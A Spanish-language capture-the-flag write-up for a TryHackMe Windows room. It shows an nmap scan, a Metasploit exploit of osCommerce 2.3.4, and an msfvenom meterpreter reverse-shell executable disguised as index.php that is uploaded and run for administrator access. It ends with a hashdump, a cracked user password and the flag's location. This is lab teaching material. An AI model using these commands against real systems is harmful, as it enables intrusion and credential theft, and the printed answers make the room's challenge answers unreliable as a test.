Bienvenidos nuevamente a otra sala de TryHackMe. En esta ocasion, explotaremos una maquina windows abusandonos de la version del servidor utilizando #Metasploit. Luego generaremos un script malicioso con ayuda de #Msfvenom creando una shell con privilegios de Administrador. Vamos!

# Recon

Como siempre, iniciaremos nuestro reconocimientos escaneando todos los puertos, listando puertos abiertos y versiones del servicio. Ejecutaremos : ``sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap``
```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.32s latency).
Scanned at 2023-04-26 01:50:57 EDT for 107s
Not shown: 47315 filtered tcp ports (no-response), 18207 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        syn-ack ttl 127 MariaDB (unauthorized)
8080/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nuestro escaneo nos muestra 13 puertos abiertos, de los cuales algunos no tendremos acceso si intentamos navegar. Asique navegaremos dentro del puerto 8080 y nos llevara a un catalago donde se almacena informacion del servicio. 

# Intrusion

Anteriormente, podremos obtener la version del servicio "**oscommerce 2.3.4**". Dado que conocemos la version, podemos buscar si existe alguna vulnerabilidad para que podamos acceder. Para ello, utilizaremos #Metasploit buscando con **search** la version para asi seleccionarla y configurarla de la siguiente forma:

> `msfconsole` --> Abriremos la terminal de Metasploit
> `search oscommerce 2.3.4` --> Buscaremos la vulnerabilidad
> `use `--> Seleccionamos 

Una vez seleccionamos la vulnerabilidad, tendremos que modificar las siguiente opciones :

> `RHOSTS` ---> IPTARGET
> `RPORT` ---> Puerto a explotar (8080)
> `TARGET URI` ---> /oscommerce-2.3.4/catalog/install
> `LHOST` ---> Nuestra IP


Configurado todo, ejecutamos el exploit con `run` y obtendremos una shell dentro del sistema. En esta terminal no tendremos mucha libertad para realizar comandos, solo podremos echar un vistazo y enumerar el servicio. Para obtener una terminal con mas privilegios y libertad, debermos crear un script malicioso que nos genere un reverse shell privilegiado.

# Priv.Escalation

Para esta tarea, vamos a utilizar #Msfvenom . Crearemos un script malicioso que nos sera util para generar una shell privilegiada y poder acceder a carpetas con permisos Administrador. Primero, crearemos el script ejecutando `msfvenom -p windows/meterpreter/reverse_tcp LHOST="" LPORT="" -f exe -o index.php`

Le diremos a msvenom que cree un ejecutable **.exe** llamado **index.php** con una carga util basada en terminal /meterpreter que generara un reverse_tcp en nuestra terminal. Esto nos dara libertad a la hora de ejecutar comandos.

Segundo, tendremos que abrir otra terminal de #Metasploit con **Multi/Handler** . Para ello, tendremos que ejecutar `use /exploit/multi/handler`  con carga util `use payload /windows/meterpreter/reverse_tcp` , Configuraremos : 

>`LHOST` ---> IP que pusimos en **msfvenom**
>`LPORT` ---> Puerto de escucha que pusimos en **msfvenom**

Una vez configurado, lo corremos con `run` o `exploit`. 
Tercero, tendremos que pasarnos nuestro script malicioso a la maquina victima, para ello, nos dirigimos a la primera sesion de meterpreter y ejecutaremos `upload index.php`. Tendremos que estar dentro del directorio del archivo.

Por ultimo, ejectuaremos el script `execute -f index.php` y obtendremos respuesta en nuestra sesion **/multi/handler**. Ya tendremos los permisos necesarios para enumerar la maquina ~

# Respuestas

#FLAG = Ejecutamos `hashdump` y nos mostrara el hash del usuario **lab** `30e87bf999828446a1c1209ddde4c450`, Lo pasamos por **crackstation** y crackeamos el hash. 	**googleplus**
#ROOT = Estara escondida en C:\ Users\ Administrator \ Desktop  